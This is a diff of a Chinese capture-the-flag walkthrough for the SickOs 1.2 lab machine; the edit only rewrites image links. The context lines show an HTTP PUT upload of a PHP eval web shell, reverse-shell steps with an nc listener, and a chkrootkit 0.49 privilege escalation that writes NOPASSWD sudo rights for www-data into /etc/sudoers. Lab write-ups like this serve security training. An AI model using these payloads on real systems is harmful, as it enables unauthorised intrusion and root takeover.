@@ -18,7 +18,7 @@ Nmap done: 1 IP address (1 host up) scanned in 6.46 seconds
 ```bash
 nikto -h http://192.168.1.206
 ```
-![[sickos-nikto.png]]
+![sickos-nikto](img/SickOs%201.2/sickos-nikto.png)
 Burp 发送请求
 ```http
 OPTIONS /test/ HTTP/1.1
@@ -43,7 +43,7 @@ Connection: close
 Date: Mon, 08 Dec 2025 06:32:09 GMT
 Server: lighttpd/1.4.28
 ```
-![[sickos-options.png]]
+![sickos-options](img/SickOs%201.2/sickos-options.png)
 发现脆弱方法 PUT，可上传 WebShell
 ```http
 PUT /test/backdoor.php HTTP/1.1
@@ -58,11 +58,11 @@ Content-Length: 32
 
 <?php @eval($_REQUEST[0]);?>
 ```
-![[sickos-webshell.png]]用 Antsword 连接
-![[sickos-antsword.png]]
+![sickos-webshell](img/SickOs%201.2/sickos-webshell.png)用 Antsword 连接
+![sickos-antsword](img/SickOs%201.2/sickos-antsword.png)
 按同样的方法上传 Reverse Shell：
 1. 先用 Burp 上传反弹 Shell 至 `/test/reverse.php`
-![[sickos-reverse_shell.png]]
+![sickos-reverse_shell](img/SickOs%201.2/sickos-reverse_shell.png)
 2. 监听端口
 ```bash
 sudo nc -lvnp 443
@@ -90,7 +90,7 @@ root      1008  0.0  0.0   2616   908 ?        Ss   22:59   0:00 cron
 cat /etc/crontab
 ls -lA /etc/cron*
 ```
-![[sickos-croncheck.png]]
+![sickos-croncheck](img/SickOs%201.2/sickos-croncheck.png)
 ```
 -rwxr-xr-x 1 root root  2032 Jun  4  2014 chkrootkit
 ```
@@ -105,14 +105,14 @@ chkrootkit version 0.49
 ```
 searchsploit chkrootkit 0.49
 ```
-![[sickos-chkrootkit_exp.png]]
+![sickos-chkrootkit_exp](img/SickOs%201.2/sickos-chkrootkit_exp.png)
 豁然开朗。
 只需用 Antsword 添加`/tmp/update`，并更改权限为`0777`
 ```bash
 #!/bin/bash
 echo "%www-data ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers
 ```
-![[sickos-update.png]]
+![sickos-update](img/SickOs%201.2/sickos-update.png)
 TODO
 
 
